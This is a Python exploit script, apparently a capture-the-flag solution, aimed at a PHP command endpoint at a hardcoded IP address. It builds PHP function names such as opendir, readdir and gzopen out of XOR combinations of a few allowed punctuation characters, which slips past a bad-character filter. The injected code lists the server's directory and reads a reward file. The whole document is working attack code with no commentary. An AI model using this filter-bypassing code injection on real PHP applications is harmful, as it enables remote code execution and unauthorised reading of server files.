import requests as req

URL = 'http://103.152.242.37:21203/'

def get_allowed_char():
    # allowed = []
    # for s in string.printable:
    #     res = req.post('http://103.152.242.37:21203/', data={'cmd' : s})
    #     if 'bad char!' not in res.text:
    #         allowed.append(s)
    
    # return allowed
    return ['$', '(', ')', ',', '.', ';', '=', '^', '_', '{', '}']

def get_char(char):
    allowed = get_allowed_char()

    for i in allowed:
        for j in allowed:
            if chr(ord(i) ^ ord(j)) == char:
                return i, j

    for i in allowed:
        for j in allowed:
            for k in allowed:
                if chr(ord(i) ^ ord(j) ^ ord(k)) == char:
                    return i, j, k
    
    for i in allowed:
        for j in allowed:
            for k in allowed:
                for l in allowed:
                    if chr(ord(i) ^ ord(j) ^ ord(k) ^ ord(l)) == char:
                        return i, j, k, l

    return None

def tuple_to_xor(tpl):
    if isinstance(tpl, str):
        return f"'{tpl}'"

    return '('+('^'.join([f"'{x}'" for x in tpl]))+')'


def craft_string(strings):
    allowed = get_allowed_char()
    result = []
    for s in strings:
        if s in allowed:
            result.append(s)
        else:
            result.append(get_char(s))
    
    # return result
    
    # payload = [f"$_={tuple_to_xor(result[0])}"]
    # for r in result[1:]:
    #     payload += [f"$_.={tuple_to_xor(r)}"]
    
    return ".".join([tuple_to_xor(x) for x in result])

def readdir(dir, url=URL):
    payload = f"$_=({craft_string('print_r')});"
    payload += f"$__=({craft_string('readdir')});"
    payload += f"$___=({craft_string('opendir')})({craft_string(dir)});"
    payload += f"$_($__($___));"*10
    res = req.post(url, data={'cmd' : payload})
    print(res.text)

def gzopen(file, url=URL):
    payload = f"$_=({craft_string('print_r')});"
    payload += f"$__=({craft_string('stream_get_contents')});"
    payload += f"$_____=({craft_string('gzopen')})(({craft_string(file)}),({craft_string('r')}));"
    payload += f"$_($__($_____));"
    res = req.post(url, data={
        'cmd' : payload,
    })
    print(payload)
    print(res.text)

readdir('.')
gzopen('read_this_for_your_reward_!.txt')

# with open('phpinfo.html', 'w') as f:
    # f.write(res.text)

# print(get_allowed_char())